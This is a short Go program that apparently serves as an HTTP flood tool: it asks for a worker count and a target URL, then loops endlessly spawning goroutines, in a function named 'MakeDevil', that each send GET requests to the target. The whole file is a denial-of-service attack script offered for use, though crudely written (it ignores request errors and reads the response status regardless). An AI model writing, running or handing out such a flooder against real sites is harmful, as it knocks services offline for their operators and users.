package main

import (
	"bufio"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"fmt"
	"github.com/remeh/sizedwaitgroup"
)

var wg sizedwaitgroup.SizedWaitGroup
var target string

func main() {

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter number of workers: ")

	text, _ := reader.ReadString('\n')
	// convert CRLF to LF
	workers := strings.Replace(text, "\n", "", -1)
	fmt.Println(workers)

	fmt.Println("Please specify your target:")
	text, _ = reader.ReadString('\n')
	target = strings.Replace(text, "\n", "", -1)
	fmt.Println(target)

	nWorkers, _ := strconv.Atoi(workers)

	wg := sizedwaitgroup.New(nWorkers)
	for true {
		wg.Add()
		go MakeDevil(&wg)
		fmt.Println("number of goroutine: ", runtime.NumGoroutine())
	}
}
func MakeDevil(wg *sizedwaitgroup.SizedWaitGroup) {
	fmt.Println("Start")
	resp, err := http.Get(target)
	_ = err
	fmt.Println(resp.Status)
	wg.Done()
}
